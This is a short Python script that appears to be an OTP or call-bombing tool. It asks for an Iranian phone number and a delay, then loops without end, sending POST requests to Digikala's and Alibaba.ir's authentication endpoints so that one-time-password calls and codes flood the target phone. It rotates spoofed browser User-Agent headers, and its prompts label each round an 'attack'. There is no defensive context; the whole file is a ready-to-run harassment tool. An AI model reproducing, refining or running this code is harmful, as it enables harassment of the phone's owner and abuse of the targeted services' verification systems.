import requests
import random
import time

#########################
Blue="\033[1;34m"
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
#########################

number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
#attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 
sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))

heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
     {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]


def data(number):
    
    url_digikala = "https://api.digikala.com/v1/user/authenticate/"
    json_digikala = {
	"backUrl": "/",
	"force_send_otp": "true",
	"otp_call": "true",
	"username": "0" + number
}

    url_alibaba = "https://ws.alibaba.ir/api/v3/account/call/otp"
    json_alibaba = {"phoneNumber": "0"+number}
    return url_digikala,json_digikala,url_alibaba,json_alibaba

url_digikala, json_digikala, url_alibaba, json_alibaba = data(number)








while True:
    random_head = random.choice(heads)

    req_Digikala = requests.post(url_digikala,json=json_digikala,headers=random_head)
    print("Digakala",req_Digikala)
    time.sleep(sleep_time)
    time.sleep(5)

    req_Alibaba = requests.post(url=url_alibaba,json=json_alibaba)
    print("Alibaba",req_Alibaba)
    time.sleep(sleep_time)









    print(Blue + "Send all requests")
#    time.sleep(attack_speed)